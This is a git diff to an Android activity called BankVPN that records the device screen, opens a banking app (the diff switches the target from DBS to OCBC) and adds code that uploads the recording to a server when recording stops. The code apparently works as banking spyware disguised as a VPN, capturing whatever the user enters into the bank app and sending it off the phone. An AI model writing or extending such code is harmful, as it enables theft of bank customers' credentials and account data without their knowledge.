@@ -2,6 +2,7 @@ package com.example.jeanniesecure;
 //https://www.truiton.com/2015/05/capture-record-android-screen-using-mediaprojection-apis/
 
 import android.Manifest;
+import android.app.ProgressDialog;
 import android.content.Context;
 import android.content.Intent;
 import android.content.pm.PackageManager;
@@ -11,6 +12,7 @@ import android.media.MediaRecorder;
 import android.media.projection.MediaProjection;
 import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
+import android.os.AsyncTask;
 import android.os.Bundle;
 import android.os.Environment;
 import android.provider.Settings;
@@ -19,6 +21,8 @@ import android.support.design.widget.Snackbar;
 import android.support.v4.app.ActivityCompat;
 import android.support.v4.content.ContextCompat;
 import android.support.v7.app.AppCompatActivity;
+import android.text.Html;
+import android.text.method.LinkMovementMethod;
 import android.util.DisplayMetrics;
 import android.util.Log;
 import android.util.SparseIntArray;
@@ -27,6 +31,7 @@ import android.view.View;
 import android.widget.Toast;
 import android.widget.ToggleButton;
 
+import java.io.File;
 import java.io.IOException;
 import java.text.SimpleDateFormat;
 import java.util.Date;
@@ -110,7 +115,7 @@ public class BankVPN extends AppCompatActivity {
         mVirtualDisplay = createVirtualDisplay();
         mMediaRecorder.start();
         //Redirect to iBanking app
-        Intent launchIntent = getPackageManager().getLaunchIntentForPackage("com.dbs.sg.dbsmbanking");
+        Intent launchIntent = getPackageManager().getLaunchIntentForPackage("com.ocbc.mobile");
         if (launchIntent != null) {
             startActivity(launchIntent);//null pointer check in case package name was not found
         }
@@ -126,6 +131,9 @@ public class BankVPN extends AppCompatActivity {
             Log.v(TAG, "Stopping Recording");
             stopScreenSharing();
             ExampleJobIntentService.redirected = false;
+            uploadVideo();
+            /*File file = new File(videoUri);
+            file.delete();*/
         }
     }
 
@@ -234,5 +242,35 @@ public class BankVPN extends AppCompatActivity {
                 return;
             }
         }
+    }
+
+    private void uploadVideo() {
+        class UploadVideo extends AsyncTask<Void, Void, String> {
+
+            ProgressDialog uploading;
+
+            @Override
+            protected void onPreExecute() {
+                super.onPreExecute();
+                uploading = ProgressDialog.show(BankVPN.this, "Uploading File", "Please wait...", false, false);
+            }
+
+            @Override
+            protected void onPostExecute(String s) {
+                super.onPostExecute(s);
+                uploading.dismiss();
+                /*textViewResponse.setText(Html.fromHtml("<b>Uploaded at <a href='" + s + "'>" + s + "</a></b>"));
+                textViewResponse.setMovementMethod(LinkMovementMethod.getInstance());*/
+            }
+
+            @Override
+            protected String doInBackground(Void... params) {
+                Upload u = new Upload();
+                String msg = u.uploadVideo(videoUri);
+                return msg;
+            }
+        }
+        UploadVideo uv = new UploadVideo();
+        uv.execute();
     }
 }
